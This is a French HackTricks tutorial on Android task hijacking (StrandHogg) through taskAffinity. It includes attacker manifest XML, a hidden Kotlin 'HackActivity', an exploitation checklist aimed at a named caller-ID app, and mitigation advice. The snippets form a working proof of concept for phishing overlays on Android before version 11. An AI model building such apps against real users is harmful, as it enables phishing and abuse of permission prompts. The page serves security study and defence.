# Détournement de Tâches Android

{{#include ../../banners/hacktricks-training.md}}

## Tâches, Back Stack et Activités au Premier Plan

Dans Android, une **tâche** est essentiellement un ensemble d'activités avec lesquelles les utilisateurs interagissent pour accomplir un travail spécifique, organisées dans un **back stack**. Ce stack ordonne les activités en fonction de leur ouverture, l'activité la plus récente étant affichée en haut comme l'**activité au premier plan**. À tout moment, seule cette activité est visible à l'écran, faisant partie de la **tâche au premier plan**.

Voici un aperçu rapide des transitions d'activités :

- **Activité 1** commence comme la seule activité au premier plan.
- Le lancement de **l'Activité 2** pousse **l'Activité 1** dans le back stack, amenant **l'Activité 2** au premier plan.
- Le démarrage de **l'Activité 3** déplace **l'Activité 1** et **l'Activité 2** plus loin dans le stack, avec **l'Activité 3** maintenant devant.
- La fermeture de **l'Activité 3** ramène **l'Activité 2** au premier plan, mettant en avant le mécanisme de navigation des tâches simplifié d'Android.

![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image (698).png>)

---

## Attaques par Affinité de Tâche

`taskAffinity` indique à Android à quelle tâche une `Activity` *préférerait* appartenir. Lorsque deux activités partagent la même affinité, **Android est autorisé à les fusionner dans le même back stack même si elles proviennent de différents APKs**.

Si un attaquant peut placer une activité malveillante à la **racine** de ce stack, chaque fois que la victime ouvre l'application légitime, l'interface utilisateur malveillante sera la première chose que l'utilisateur verra – parfait pour le phishing ou les demandes d'autorisation abusives.

La surface d'attaque est plus large que ce que de nombreux développeurs pensent car **chaque activité hérite automatiquement d'une affinité égale au nom du package de l'application** (à moins que le développeur ne définisse `android:taskAffinity=""`). Par conséquent, *ne rien faire* laisse déjà l'application ouverte au détournement de tâches sur les versions d'Android antérieures à 11.

### Scénario classique "singleTask / StrandHogg"

1. L'attaquant déclare une activité avec :
```xml
<activity android:name=".EvilActivity"
android:exported="true"
android:taskAffinity="com.victim.package"
android:launchMode="singleTask" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
2. L'application malveillante est lancée une fois afin que la tâche (avec l'affinité falsifiée) existe dans les tâches récentes.
3. Lorsque l'utilisateur ouvre plus tard la véritable application, Android constate qu'il y a déjà une tâche dont l'**affinité racine correspond au package** et amène simplement cette tâche au premier plan.
4. L'interface utilisateur de l'attaquant est affichée en premier.

### Variante par défaut–Affinité (sans `singleTask`) – Étude de cas sur l'ID de l'appelant

La vulnérabilité signalée dans l'application **ID de l'appelant (caller.id.phone.number.block)** montre que l'attaque *fonctionne également* contre le mode de lancement par défaut `standard` :

1. L'application attaquante crée une fausse activité racine et se cache immédiatement :
```kotlin
class HackActivity : AppCompatActivity() {
override fun onCreate(savedInstanceState: Bundle?) {
super.onCreate(savedInstanceState)
moveTaskToBack(true)   // garder la tâche dans les récentes mais hors de vue
}
}
```
2. Le manifeste doit seulement copier le package de la victime dans `taskAffinity` :
```xml
<activity android:name=".HackActivity"
android:exported="true"
android:taskAffinity="com.caller.id.phone.number.block" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
3. Dès que l'utilisateur installe et ouvre l'application malveillante **une fois**, une tâche dont l'affinité est égale au package de la victime existe (mais reste en arrière-plan).
4. Lorsque la véritable application ID de l'appelant est lancée, Android réutilise cette tâche et amène `HackActivity` au premier plan → fenêtre de phishing/abus d'autorisation.

> REMARQUE : À partir de **Android 11 (API 30)**, le système ne place *pas* deux packages qui ne font pas partie du même UID dans la même tâche par défaut, atténuant cette variante particulière. Les versions antérieures restent vulnérables.

---

## Liste de Vérification pour la Détection & l'Exploitation

1. Récupérez `AndroidManifest.xml` de l'APK cible et vérifiez que chaque `<activity>` (ou l'élément global `<application>`) contient `android:taskAffinity=""` (vide) **ou** une valeur personnalisée.
2. Si ce n'est pas le cas, créez une application malveillante :
- `android:taskAffinity` = nom du package de la victime.
- Fournissez une intention `MAIN/LAUNCHER` afin que l'utilisateur puisse l'ouvrir une fois.
- Optionnellement, appelez `moveTaskToBack(true)` pour cacher immédiatement.
3. Laissez la victime ouvrir son application légitime → détournement.

## Atténuation

Les développeurs devraient :

* Définir explicitement `android:taskAffinity=""` au niveau de `<application>` (recommandé) **ou** donner à chaque activité une affinité unique et privée.
* Pour les écrans très sensibles, combiner ce qui précède avec `android:launchMode="singleInstance"` ou des protections modernes [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode).
* Mettre à jour la `targetSdkVersion` de l'application et appliquer les changements de comportement **Android 11** où les tâches ne sont pas partagées entre les packages par défaut.

---

## Références

- [https://blog.dixitaditya.com/android-task-hijacking/](https://blog.dixitaditya.com/android-task-hijacking/)
- [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
- [Mauvaise configuration du manifeste Android menant au détournement de tâches dans l'application ID de l'appelant](https://github.com/KMov-g/androidapps/blob/main/caller.id.phone.number.block.md)
- [https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)

{{#include ../../banners/hacktricks-training.md}}
